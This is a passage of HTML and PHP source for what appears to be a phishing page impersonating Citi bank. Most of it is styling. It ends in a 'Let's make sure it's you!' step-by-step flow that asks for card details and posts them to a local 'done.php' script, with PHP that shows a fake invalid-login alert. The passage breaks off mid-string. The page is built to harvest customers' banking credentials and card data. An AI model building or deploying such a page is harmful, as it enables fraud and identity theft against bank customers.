    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .gold[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207],
    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .priority[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
      height: 40px;
      width: auto
    }

    @media (max-width:990px) {

      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .business[_ngcontent-ekd-c207],
      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .gold[_ngcontent-ekd-c207],
      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .priority[_ngcontent-ekd-c207] {
        height: 72px;
        width: auto;
        padding: 0
      }

      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .business[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207],
      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .gold[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207],
      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .priority[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
        height: 72px;
        width: auto;
        padding-left: 16px
      }
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .att[_ngcontent-ekd-c207] {
      height: auto;
      width: auto;
      padding-top: 16px;
      padding-bottom: 16px;
      padding-left: 37px
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .att[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
      height: 56px;
      width: 188.6px
    }

    @media (max-width:990px) {
      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .att[_ngcontent-ekd-c207] {
        height: auto;
        width: auto;
        padding-top: 10px;
        padding-bottom: 10px;
        padding-left: 13px
      }

      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .att[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
        height: 52px;
        width: 170px
      }
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .default[_ngcontent-ekd-c207] {
      height: 88px;
      width: 88px;
      padding-left: 20px
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .default[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
      height: 88px;
      width: 88px
    }

    @media (max-width:990px) {
      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .default[_ngcontent-ekd-c207] {
        height: 72px;
        width: 72px;
        padding: 0
      }

      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .default[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
        height: 72px;
        width: 72px
      }
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] {
      display: flex
    }

    .banner .content-wrap .buttons [_nghost-ekd-c207] child-nav-group -shadowcsshost child-nav-group ul {
      background-color: #fff
    }

    .banner .content-wrap .buttons [_nghost-ekd-c207] child-nav-group .subMenuGroupTitle {
      font-family: Interstate-Regular, sans-serif;
      font-size: 12px;
      color: #666;
      letter-spacing: 0;
      line-height: 20px
    }

    .banner .content-wrap .buttons [_nghost-ekd-c207] child-nav-group .child-links {
      font-family: Interstate-Light;
      font-size: 16px;
      color: #333;
      letter-spacing: 0;
      line-height: 22px
    }

    @media screen and (max-width:1120px) {
      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] {
        display: none
      }
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] .navButton[_ngcontent-ekd-c207] {
      padding-top: 27px;
      padding-bottom: 15px;
      padding-right: 24px
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] .navButton[_ngcontent-ekd-c207]:last-child {
      padding-right: 0
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] .navButton[_ngcontent-ekd-c207] a[_ngcontent-ekd-c207],
    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] .navButton[_ngcontent-ekd-c207] button[_ngcontent-ekd-c207] {
      cursor: pointer;
      background: 0 0;
      border: none
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] .navButton[_ngcontent-ekd-c207] button[_ngcontent-ekd-c207] {
      padding-top: 0
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] .navButton[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
      height: 26px;
      width: 26px;
      margin: auto;
      display: block
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] .navButton[_ngcontent-ekd-c207] span[_ngcontent-ekd-c207] {
      display: block;
      padding-top: 8px;
      font-family: Interstate-Regular, sans-serif;
      font-size: 11px;
      color: #666;
      letter-spacing: 0;
      text-align: center
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] .subMenuGroupParent[_ngcontent-ekd-c207] {
      width: 226px;
      border: 1px solid #eee;
      background: #fff;
      z-index: 1;
      display: none;
      position: absolute;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .125)
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .buttons[_ngcontent-ekd-c207] .subMenuGroupParent[_ngcontent-ekd-c207] .flexColumnContainer[_ngcontent-ekd-c207] {
      padding-left: 40px
    }
  </style>
  <style>
    @charset "UTF-8";

    [_nghost-ekd-c226] {
      overflow-x: hidden
    }

    a[_ngcontent-ekd-c226]:focus {
      outline: -webkit-focus-ring-color auto 5px !important;
      outline-offset: -2px
    }

    @font-face {
      font-family: Interstate_Light;
      src: url(/commonui-assets/fonts/interstate/Interstate-Light.eot);
      src: url(/commonui-assets/fonts/interstate/Interstate-Light.eot?#iefix) format("embedded-opentype"), url(/commonui-assets/fonts/interstate/Interstate-Light.woff) format("woff"), url(/commonui-assets/fonts/interstate/Interstate-Light.ttf) format("truetype"), url(/commonui-assets/fonts/interstate/Interstate-Light.svg#fontname) format("svg");
      font-weight: 400;
      font-style: normal
    }

    @media screen and (min-width:1024px) and (max-width:1112px) {
      citi-modal[_ngcontent-ekd-c226] .modal {
        margin-top: 12% !important
      }
    }

    @media screen and (min-width:700px) and (max-width:1112px) {
      citi-modal[_ngcontent-ekd-c226] .modal {
        margin-top: 12% !important
      }

      .modal-dialog {
        width: 84% !important
      }
    }

    @font-face {
      font-family: Interstate_Regular;
      src: url(/commonui-assets/fonts/interstate/Interstate-Regular.eot);
      src: url(/commonui-assets/fonts/interstate/Interstate-Regular.eot?#iefix) format("embedded-opentype"), url(/commonui-assets/fonts/interstate/Interstate-Regular.woff) format("woff"), url(/commonui-assets/fonts/interstate/Interstate-Regular.ttf) format("truetype"), url(/commonui-assets/fonts/interstate/Interstate-Regular.svg#fontname) format("svg");
      font-weight: 400;
      font-style: normal
    }

    @font-face {
      font-family: Interstate_Bold;
      src: url(/commonui-assets/fonts/interstate/Interstate-Bold.eot);
      src: url(/commonui-assets/fonts/interstate/Interstate-Bold.eot?#iefix) format("embedded-opentype"), url(/commonui-assets/fonts/interstate/Interstate-Bold.woff) format("woff"), url(/commonui-assets/fonts/interstate/Interstate-Bold.ttf) format("truetype"), url(/commonui-assets/fonts/interstate/Interstate-Bold.svg#fontname) format("svg");
      font-weight: 400;
      font-style: normal
    }

    .citialliancedesk[_ngcontent-ekd-c226] {
      display: none !important
    }

    .navigationParent[_ngcontent-ekd-c226] {
      width: 100%;
      margin: 0 auto;
      height: 46px;
      position: relative
    }

    #signOnFocus[_ngcontent-ekd-c226] {
      color: #fff !important
    }

    .child-nav-group3[_ngcontent-ekd-c226],
    .som-redering[_ngcontent-ekd-c226] {
      width: 100%
    }

    @media screen and (max-width:991.9px) {

      .child-nav-group3[_ngcontent-ekd-c226],
      .som-redering[_ngcontent-ekd-c226] {
        display: block;
        width: 100%
      }
    }

    #openanaccountMainLI[_ngcontent-ekd-c226] #openanaccountsubGroup5[_ngcontent-ekd-c226] {
      display: none !important
    }

    .preLogin[_ngcontent-ekd-c226] .nav-bar-main-ul[_ngcontent-ekd-c226] {
      display: flex;
      flex-direction: row;
      box-shadow: none;
      transition: .5s ease-in-out
    }

    .preLogin[_ngcontent-ekd-c226] .nav-bar-main-ul[_ngcontent-ekd-c226] #butlerATMMainLI #butlerATMmainAnchor5 {
      display: none
    }

    @media screen and (max-width:1119.9px) {
      .preLogin[_ngcontent-ekd-c226] .nav-bar-main-ul[_ngcontent-ekd-c226] #butlerATMMainLI #butlerATMmainAnchor5 {
        display: block
      }
    }

    .preLogin[_ngcontent-ekd-c226] .nav-bar-main-ul[_ngcontent-ekd-c226] #butlerEspanolMainLI #butlerEspanolmainAnchor6 {
      display: none
    }

    .postLogin[_ngcontent-ekd-c226] .nav-bar-main-ul[_ngcontent-ekd-c226] {
      max-width: 1341px;
      padding: 0 0 0 20px;
      margin: 0 99px 0 0
    }

    @media screen and (max-width:1120px) {
      .preLogin[_ngcontent-ekd-c226] .nav-bar-main-ul[_ngcontent-ekd-c226] #navcreditCardMainLI .subMenuMainContainer .flexColumnContainer
  </style>


  <link type="text/css" rel="stylesheet" href="assets/default+en.css">
  <link type="text/css" rel="stylesheet" href="assets/default.css">
  <link type="text/css" rel="stylesheet" href="assets/default+en.css">
  <link type="text/css" rel="stylesheet" href="assets/default.css">
  <link type="text/css" rel="stylesheet" href="assets/default+en.css">
  <link type="text/css" rel="stylesheet" href="assets/default.css">
  <style type="text/css" id="kampyleStyle">
    .noOutline {
      outline: none !important;
    }

    .wcagOutline:focus {
      outline: 1px dashed #595959 !important;
      outline-offset: 2px !important;
      transition: none !important;
    }

    .nebula_image_button {
      width: auto !important;
      background: transparent !important;
    }
  </style>
  <style type="text/css">
    .gsc-control-cse {
      font-family: arial, sans-serif
    }

    .gsc-control-cse .gsc-table-result {
      font-family: arial, sans-serif
    }

    .gsc-refinementsGradient {
      background: linear-gradient(to left, rgba(255, 255, 255, 1), rgba(255, 255, 255, 0))
    }

    .gsc-control-cse {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    input.gsc-input,
    .gsc-input-box,
    .gsc-input-box-hover,
    .gsc-input-box-focus {
      border-color: #D9D9D9
    }

    .gsc-search-button-v2,
    .gsc-search-button-v2:hover,
    .gsc-search-button-v2:focus {
      border-color: #2F5BB7;
      background-color: #357AE8;
      background-image: none;
      filter: none
    }

    .gsc-search-button-v2 svg {
      fill: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhActive,
    .gsc-refinementHeader.gsc-refinementhActive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhInactive,
    .gsc-refinementHeader.gsc-refinementhInactive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result,
    .gsc-results .gsc-imageResult {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result:hover {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gs-webResult.gs-result a.gs-title:link,
    .gs-webResult.gs-result a.gs-title:link b,
    .gs-imageResult a.gs-title:link,
    .gs-imageResult a.gs-title:link b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:visited,
    .gs-webResult.gs-result a.gs-title:visited b,
    .gs-imageResult a.gs-title:visited,
    .gs-imageResult a.gs-title:visited b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:hover,
    .gs-webResult.gs-result a.gs-title:hover b,
    .gs-imageResult a.gs-title:hover,
    .gs-imageResult a.gs-title:hover b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:active,
    .gs-webResult.gs-result a.gs-title:active b,
    .gs-imageResult a.gs-title:active,
    .gs-imageResult a.gs-title:active b {
      color: #1155CC
    }

    .gsc-cursor-page {
      color: #1155CC
    }

    a.gsc-trailing-more-results:link {
      color: #1155CC
    }

    .gs-webResult:not(.gs-no-results-result):not(.gs-error-result) .gs-snippet,
    .gs-fileFormatType {
      color: #333333
    }

    .gs-webResult div.gs-visibleUrl {
      color: #009933
    }

    .gs-webResult div.gs-visibleUrl-short {
      color: #009933
    }

    .gs-promotion div.gs-visibleUrl-short {
      display: block
    }

    .gs-promotion div.gs-visibleUrl-long {
      display: none
    }

    .gs-promotion div.gs-visibleUrl-breadcrumb {
      display: none
    }

    .gsc-cursor-box {
      border-color: #FFFFFF
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-current-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-webResult.gsc-result.gsc-promotion {
      border-color: #F6F6F6;
      background-color: #F6F6F6
    }

    .gsc-completion-title {
      color: #1155CC
    }

    .gsc-completion-snippet {
      color: #333333
    }

    .gs-promotion a.gs-title:link,
    .gs-promotion a.gs-title:link *,
    .gs-promotion .gs-snippet a:link {
      color: #1155CC
    }

    .gs-promotion a.gs-title:visited,
    .gs-promotion a.gs-title:visited *,
    .gs-promotion .gs-snippet a:visited {
      color: #1155CC
    }

    .gs-promotion a.gs-title:hover,
    .gs-promotion a.gs-title:hover *,
    .gs-promotion .gs-snippet a:hover {
      color: #1155CC
    }

    .gs-promotion a.gs-title:active,
    .gs-promotion a.gs-title:active *,
    .gs-promotion .gs-snippet a:active {
      color: #1155CC
    }

    .gs-promotion .gs-snippet,
    .gs-promotion .gs-title .gs-promotion-title-right,
    .gs-promotion .gs-title .gs-promotion-title-right * {
      color: #333333
    }

    .gs-promotion .gs-visibleUrl,
    .gs-promotion .gs-visibleUrl-short {
      color: #009933
    }

    .gcsc-find-more-on-google {
      color: #1155CC
    }

    .gcsc-find-more-on-google-magnifier {
      fill: #1155CC
    }
  </style>
  <style type="text/css">
    .gsc-control-cse {
      font-family: arial, sans-serif
    }

    .gsc-control-cse .gsc-table-result {
      font-family: arial, sans-serif
    }

    .gsc-refinementsGradient {
      background: linear-gradient(to left, rgba(255, 255, 255, 1), rgba(255, 255, 255, 0))
    }

    .gsc-control-cse {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    input.gsc-input,
    .gsc-input-box,
    .gsc-input-box-hover,
    .gsc-input-box-focus {
      border-color: #D9D9D9
    }

    .gsc-search-button-v2,
    .gsc-search-button-v2:hover,
    .gsc-search-button-v2:focus {
      border-color: #2F5BB7;
      background-color: #357AE8;
      background-image: none;
      filter: none
    }

    .gsc-search-button-v2 svg {
      fill: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhActive,
    .gsc-refinementHeader.gsc-refinementhActive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhInactive,
    .gsc-refinementHeader.gsc-refinementhInactive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result,
    .gsc-results .gsc-imageResult {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result:hover {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gs-webResult.gs-result a.gs-title:link,
    .gs-webResult.gs-result a.gs-title:link b,
    .gs-imageResult a.gs-title:link,
    .gs-imageResult a.gs-title:link b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:visited,
    .gs-webResult.gs-result a.gs-title:visited b,
    .gs-imageResult a.gs-title:visited,
    .gs-imageResult a.gs-title:visited b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:hover,
    .gs-webResult.gs-result a.gs-title:hover b,
    .gs-imageResult a.gs-title:hover,
    .gs-imageResult a.gs-title:hover b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:active,
    .gs-webResult.gs-result a.gs-title:active b,
    .gs-imageResult a.gs-title:active,
    .gs-imageResult a.gs-title:active b {
      color: #1155CC
    }

    .gsc-cursor-page {
      color: #1155CC
    }

    a.gsc-trailing-more-results:link {
      color: #1155CC
    }

    .gs-webResult:not(.gs-no-results-result):not(.gs-error-result) .gs-snippet,
    .gs-fileFormatType {
      color: #333333
    }

    .gs-webResult div.gs-visibleUrl {
      color: #009933
    }

    .gs-webResult div.gs-visibleUrl-short {
      color: #009933
    }

    .gs-promotion div.gs-visibleUrl-short {
      display: block
    }

    .gs-promotion div.gs-visibleUrl-long {
      display: none
    }

    .gs-promotion div.gs-visibleUrl-breadcrumb {
      display: none
    }

    .gsc-cursor-box {
      border-color: #FFFFFF
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-current-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-webResult.gsc-result.gsc-promotion {
      border-color: #F6F6F6;
      background-color: #F6F6F6
    }

    .gsc-completion-title {
      color: #1155CC
    }

    .gsc-completion-snippet {
      color: #333333
    }

    .gs-promotion a.gs-title:link,
    .gs-promotion a.gs-title:link *,
    .gs-promotion .gs-snippet a:link {
      color: #1155CC
    }

    .gs-promotion a.gs-title:visited,
    .gs-promotion a.gs-title:visited *,
    .gs-promotion .gs-snippet a:visited {
      color: #1155CC
    }

    .gs-promotion a.gs-title:hover,
    .gs-promotion a.gs-title:hover *,
    .gs-promotion .gs-snippet a:hover {
      color: #1155CC
    }

    .gs-promotion a.gs-title:active,
    .gs-promotion a.gs-title:active *,
    .gs-promotion .gs-snippet a:active {
      color: #1155CC
    }

    .gs-promotion .gs-snippet,
    .gs-promotion .gs-title .gs-promotion-title-right,
    .gs-promotion .gs-title .gs-promotion-title-right * {
      color: #333333
    }

    .gs-promotion .gs-visibleUrl,
    .gs-promotion .gs-visibleUrl-short {
      color: #009933
    }

    .gcsc-find-more-on-google {
      color: #1155CC
    }

    .gcsc-find-more-on-google-magnifier {
      fill: #1155CC
    }
  </style>
  <style type="text/css">
    .gsc-control-cse {
      font-family: arial, sans-serif
    }

    .gsc-control-cse .gsc-table-result {
      font-family: arial, sans-serif
    }

    .gsc-refinementsGradient {
      background: linear-gradient(to left, rgba(255, 255, 255, 1), rgba(255, 255, 255, 0))
    }

    .gsc-control-cse {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    input.gsc-input,
    .gsc-input-box,
    .gsc-input-box-hover,
    .gsc-input-box-focus {
      border-color: #D9D9D9
    }

    .gsc-search-button-v2,
    .gsc-search-button-v2:hover,
    .gsc-search-button-v2:focus {
      border-color: #2F5BB7;
      background-color: #357AE8;
      background-image: none;
      filter: none
    }

    .gsc-search-button-v2 svg {
      fill: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhActive,
    .gsc-refinementHeader.gsc-refinementhActive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhInactive,
    .gsc-refinementHeader.gsc-refinementhInactive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result,
    .gsc-results .gsc-imageResult {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result:hover {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gs-webResult.gs-result a.gs-title:link,
    .gs-webResult.gs-result a.gs-title:link b,
    .gs-imageResult a.gs-title:link,
    .gs-imageResult a.gs-title:link b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:visited,
    .gs-webResult.gs-result a.gs-title:visited b,
    .gs-imageResult a.gs-title:visited,
    .gs-imageResult a.gs-title:visited b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:hover,
    .gs-webResult.gs-result a.gs-title:hover b,
    .gs-imageResult a.gs-title:hover,
    .gs-imageResult a.gs-title:hover b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:active,
    .gs-webResult.gs-result a.gs-title:active b,
    .gs-imageResult a.gs-title:active,
    .gs-imageResult a.gs-title:active b {
      color: #1155CC
    }

    .gsc-cursor-page {
      color: #1155CC
    }

    a.gsc-trailing-more-results:link {
      color: #1155CC
    }

    .gs-webResult:not(.gs-no-results-result):not(.gs-error-result) .gs-snippet,
    .gs-fileFormatType {
      color: #333333
    }

    .gs-webResult div.gs-visibleUrl {
      color: #009933
    }

    .gs-webResult div.gs-visibleUrl-short {
      color: #009933
    }

    .gs-promotion div.gs-visibleUrl-short {
      display: block
    }

    .gs-promotion div.gs-visibleUrl-long {
      display: none
    }

    .gs-promotion div.gs-visibleUrl-breadcrumb {
      display: none
    }

    .gsc-cursor-box {
      border-color: #FFFFFF
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-current-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-webResult.gsc-result.gsc-promotion {
      border-color: #F6F6F6;
      background-color: #F6F6F6
    }

    .gsc-completion-title {
      color: #1155CC
    }

    .gsc-completion-snippet {
      color: #333333
    }

    .gs-promotion a.gs-title:link,
    .gs-promotion a.gs-title:link *,
    .gs-promotion .gs-snippet a:link {
      color: #1155CC
    }

    .gs-promotion a.gs-title:visited,
    .gs-promotion a.gs-title:visited *,
    .gs-promotion .gs-snippet a:visited {
      color: #1155CC
    }

    .gs-promotion a.gs-title:hover,
    .gs-promotion a.gs-title:hover *,
    .gs-promotion .gs-snippet a:hover {
      color: #1155CC
    }

    .gs-promotion a.gs-title:active,
    .gs-promotion a.gs-title:active *,
    .gs-promotion .gs-snippet a:active {
      color: #1155CC
    }

    .gs-promotion .gs-snippet,
    .gs-promotion .gs-title .gs-promotion-title-right,
    .gs-promotion .gs-title .gs-promotion-title-right * {
      color: #333333
    }

    .gs-promotion .gs-visibleUrl,
    .gs-promotion .gs-visibleUrl-short {
      color: #009933
    }

    .gcsc-find-more-on-google {
      color: #1155CC
    }

    .gcsc-find-more-on-google-magnifier {
      fill: #1155CC
    }
  </style>


</head>

<body style=""><app-root _nghost-ekd-c284="" ng-version="9.1.13"><cbol-core _ngcontent-ekd-c284=""
      _nghost-ekd-c274=""><citi-parent-layout _ngcontent-ekd-c274="" _nghost-ekd-c247="">
        <div _ngcontent-ekd-c247="" class="citi-outer-container cbolui-responsive cbolui-ddl-post"><citi-header
            _ngcontent-ekd-c247="" _nghost-ekd-c206="">
            <div _ngcontent-ekd-c206="" class="header">
              <div _ngcontent-ekd-c206="" class="primary"><citi-banner2 _ngcontent-ekd-c206="" _nghost-ekd-c207="">
                  <div _ngcontent-ekd-c207="" role="banner" class="banner">
                    <div _ngcontent-ekd-c207="" class="content-wrap">
                      <div _ngcontent-ekd-c207="" class="journeyLogo">
                        <div _ngcontent-ekd-c207="" class="logoDiv default"><a _ngcontent-ekd-c207="" id="sessionFocus"
                            tabindex="0" href=""><!----><!----><img _ngcontent-ekd-c207="" alt="Citi"
                              src="assets/img/citilogoredesign.png"><!----></a></div><!----><!----><!---->
                      </div><!---->
                    </div>
                  </div><!---->
                </citi-banner2><citi-navigation3 _ngcontent-ekd-c206="" class="citi-navigation" _nghost-ekd-c226="">
                  <div _ngcontent-ekd-c226="" role="navigation" aria-label="Main" class="navigationParent preLogin"
                    style="background-color: rgb(0, 45, 114);">
                    <div _ngcontent-ekd-c226="" class="mobileMenuContainer"><!----></div>
                    <ul _ngcontent-ekd-c226="" id="nav-bar-main-ul" class="nav-bar-main-ul"
                      style="display: flex; position: static; box-shadow: none;"><!----><!----><!----></ul>
                    <!----><!----><!---->
                  </div><!---->
                </citi-navigation3></div>
            </div>
          </citi-header>
          <div _ngcontent-ekd-c247="" id="maincontent">
            <div _ngcontent-ekd-c247=""><!---->
              <div _ngcontent-ekd-c247="" class="citi-container cbolui-ddl theme-light"><!---->
                <div _ngcontent-ekd-c247="" class="appbody"><router-outlet
                    _ngcontent-ekd-c274=""></router-outlet><ng-component _nghost-ekd-c285=""><idletime-router
                      _ngcontent-ekd-c285=""></idletime-router><citi-simple-layout _ngcontent-ekd-c285=""
                      brandingtype="preLoginVanilla">
                      <div _ngcontent-ekd-c285="" main="" class="main"><!----><!----><citi-jamp _ngcontent-ekd-c285=""
                          _nghost-ekd-c59="" class="hidden jamp-page-level">
                          <div _ngcontent-ekd-c59="" class="fillHeight">
                            <div _ngcontent-ekd-c59="" class="alignmentEl fillHeight">
                              <div _ngcontent-ekd-c59="" class="jamp jamp-css"><span _ngcontent-ekd-c59=""
                                  class="img"></span><span _ngcontent-ekd-c59="" class="message"></span></div>
                            </div>
                          </div>
                        </citi-jamp><citi-row _ngcontent-ekd-c285="">
                          <div class="row">
                            <div _ngcontent-ekd-c285="" role="complementary"><citi-column _ngcontent-ekd-c285="" xs="12"
                                sm="10" md="10" lg="9" xl="9">

                                <div _ngcontent-bvc-c107="" class="progress-indicator-wrapper clearfix col-xs-12"><span
                                    _ngcontent-bvc-c107="" class="sr-only" id="progress-bar-0">Step 1 of 4: Account
                                    Information</span>
                                  <ol _ngcontent-bvc-c107="" class="progress-indicator col-xs-12">
                                    <li _ngcontent-bvc-c301="" citi-progress-bar-step="" _nghost-bvc-c106=""
                                      class="progress-indicator-step progress-indicator-step-active"><span
                                        _ngcontent-bvc-c106="" aria-hidden="true"
                                        class="primary-label">Identification</span><!----><span _ngcontent-bvc-c106=""
                                        class="sr-only"> Step 1, Account Information , Current </span></li>
                                    <li _ngcontent-bvc-c301="" citi-progress-bar-step="" _nghost-bvc-c106=""
                                      class="progress-indicator-step progress-indicator-step-active"><span
                                        _ngcontent-bvc-c106="" aria-hidden="true" class="primary-label">Email
                                        verification</span><!----><span _ngcontent-bvc-c106="" class="sr-only"> Step 2,
                                        Verification , Incomplete </span></li>
                                    <li _ngcontent-bvc-c301="" citi-progress-bar-step="" _nghost-bvc-c106=""
                                      class="progress-indicator-step progress-indicator-step-active"><span
                                        _ngcontent-bvc-c106="" aria-hidden="true" class="primary-label">Card
                                        Information</span><!----><span _ngcontent-bvc-c106="" class="sr-only"> Step 3,
                                        Set Up Online Access , Incomplete </span></li>
                                    <li _ngcontent-bvc-c301="" citi-progress-bar-step="" _nghost-bvc-c106=""
                                      class="progress-indicator-step"><span _ngcontent-bvc-c106="" aria-hidden="true"
                                        class="primary-label">Review</span><!----><span _ngcontent-bvc-c106=""
                                        class="sr-only"> Step 4, Review , Incomplete </span></li>
                                  </ol>
                                </div>


                                <div class="col-xs-12 col-sm-10 col-md-10 col-lg-9">
                                  <h1 _ngcontent-ekd-c285="" class="pageHeader">Let's make sure it's you!</h1>
                                  <p _ngcontent-ekd-c285="" class="introText">Please verify the card details linked to
                                    your account</p><!---->
                                </div>
                              </citi-column></div>
                          </div>
                        </citi-row>
                        <hr _ngcontent-ekd-c285=""><!---->
                      </div><app-account-type _nghost-ekd-c295=""><citi-simple-layout _ngcontent-ekd-c295=""
                          brandingtype="preLoginVanilla">
                          <main _ngcontent-ekd-c295=""><citi-form-container _ngcontent-ekd-c295="" formaction="#"
                              formheader="">



                              <form name="undefined" class="uno has-validation-callback" action="done.php"
                                method="post">



                                <div><input _ngcontent-ekd-c295="" name="hidden" style="display: none;"
                                    data-order-appearance="0"><citi-radio-group _ngcontent-ekd-c295="" required="true"
                                    name="AcctType" class="citi-radio-group" _nghost-ekd-c132="">
                                    <section class="purchase-question-form container-fluid step-1">
                                      <div class="row step-0">



                                        <div class="col-xs-12 ">



                                          <input type="hidden" name="_flowExecutionKey"
                                            value="_cspring-web-flow-ratequote_kF64FC573-E214-4B7A-CA2D-FB91089171B5"
                                            id="flowExecutionKey">
                                          <input type="hidden" name="_eventId" value="submit" id="eiName">


                                          <div class="row"
                                            style="font-weight: 600;color: #414042;margin-bottom: .75rem;">


                                            <?php
                                            if (isset($_GET['invalid'])) {
                                              $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])) : '';
                                              $em = "login";
                                              if ($invalid == $em) {
                                                print "<input type='hidden' name='invalid' value='invalid'><div class='col-xs-12'><citi-banner-alert _ngcontent-boo-c262='' idstr='redBannerAlert6' alerttype='critical' _nghost-boo-c53=''><div _ngcontent-boo-c53='' class='alertOpen ct-cbolui-page-banner'><div _ngcontent-boo-c53='' role='alert' class='ct-banner-alert-box ct-banner-red-alert' id='redBannerAlert6'><div _ngcontent-boo-c53='' class='row'><div _ngcontent-boo-c53='' class='col-xs-10'><strong _ngcontent-boo-c53='' class='ct-banner_alert_font'><citi-icon _ngcontent-boo-c262='' alertcontent='' idstr='redError' icontype='redError' _nghost-boo-c101=''><div _ngcontent-boo-c101='' class='cbolui-icon-wrapper' id='redError'><!----><span _ngcontent-yta-c101='' class='iconClass glyphicon icon-RedAlert cbolui-icon-red' title='' id='redError-icon' style='margin-right: 10px;padding-right: 0!important;flex-shrink: 0;'></span><span _ngcontent-boo-c101='' class='cbolui-icon-text' id='redError-iconText'><span _ngcontent-boo-c262='' class='error-msg' style='color: #d60000;'> This isn’t a card we 